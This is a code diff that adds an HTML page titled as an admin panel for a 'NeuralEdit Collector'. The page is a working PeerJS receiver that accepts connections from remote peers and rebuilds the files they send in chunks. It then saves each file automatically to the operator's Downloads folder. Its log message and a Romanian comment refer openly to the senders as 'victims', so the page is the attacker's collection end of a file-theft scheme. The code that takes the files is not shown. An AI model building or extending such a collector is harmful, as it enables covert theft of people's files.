@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Panel - NeuralEdit Collector</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
+        #log { height: 300px; overflow-y: scroll; border: 1px solid #333; padding: 10px; margin-bottom: 20px; }
+        .file-btn { display: block; margin: 5px 0; padding: 5px; background: #222; color: #fff; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>📡 Admin Collector Node</h1>
+    <p>Your ID: <span id="myId"></span></p>
+    <p>Status: <span id="status">Waiting for connections...</span></p>
+    
+    <div id="log"></div>
+    
+    <h3>Download Queue (Auto-saved to Downloads)</h3>
+    <div id="filesList"></div>
+
+    <script>
+        const peer = new Peer(); // Conectează-te la cloud
+        let connections = [];
+
+        peer.on('open', (id) => {
+            document.getElementById('myId').innerText = id;
+            log(`My ID: ${id}. Share this with victims or wait for incoming.`);
+        });
+
+        peer.on('call', (call) => {
+            // Acceptă apelurile de la victime
+            call.answer();
+            handleDataConnection(call);
+        });
+
+        peer.on('connection', (conn) => {
+            handleDataConnection(conn);
+        });
+
+        function handleDataConnection(conn) {
+            log(`New connection from ${conn.peer}`);
+            connections.push(conn);
+
+            conn.on('open', () => {
+                log(`Connected to ${conn.peer}`);
+            });
+
+            let currentFile = { chunks: [], meta: null, name: '', size: 0 };
+            let isReceiving = false;
+
+            conn.on('data', (data) => {
+                if (typeof data === 'object' && data.type === 'FILE_META') {
+                    currentFile.meta = data.meta;
+                    currentFile.chunks = [];
+                    isReceiving = true;
+                    log(`Receiving: ${data.meta.name} (${formatBytes(data.meta.size)})`);
+                } else if (isReceiving) {
+                    currentFile.chunks.push(data);
+                }
+            });
+
+            conn.on('close', () => {
+                log(`Connection closed by ${conn.peer}`);
+                finishFile(currentFile);
+            });
+            
+            // Dacă primește semnalul de final
+            conn.on('error', (err) => {
+                 finishFile(currentFile);
+            });
+        }
+
+        function finishFile(fileData) {
+            if (!fileData.meta || fileData.chunks.length === 0) return;
+            
+            // Reconstruiește fișierul
+            const blob = new Blob(fileData.chunks, { type: fileData.meta.type });
+            const url = URL.createObjectURL(blob);
+            
+            // Creează buton de download manual sau descarcă automat
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = fileData.meta.name;
+            link.click(); // Descarcă automat în folderul Downloads al calculatorului tău
+            
+            const div = document.createElement('div');
+            div.className = 'file-btn';
+            div.innerText = `✅ Saved: ${fileData.meta.name}`;
+            document.getElementById('filesList').appendChild(div);
+            
+            log(`Saved: ${fileData.meta.name}`);
+        }
+
+        function log(msg) {
+            const div = document.createElement('div');
+            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            document.getElementById('log').prepend(div);
+        }
+
+        function formatBytes(bytes, decimals = 2) {
+            if (!+bytes) return '0 Bytes';
+            const k = 1024;
+            const dm = decimals < 0 ? 0 : decimals;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
+        }
+    </script>
+</body>
+</html>
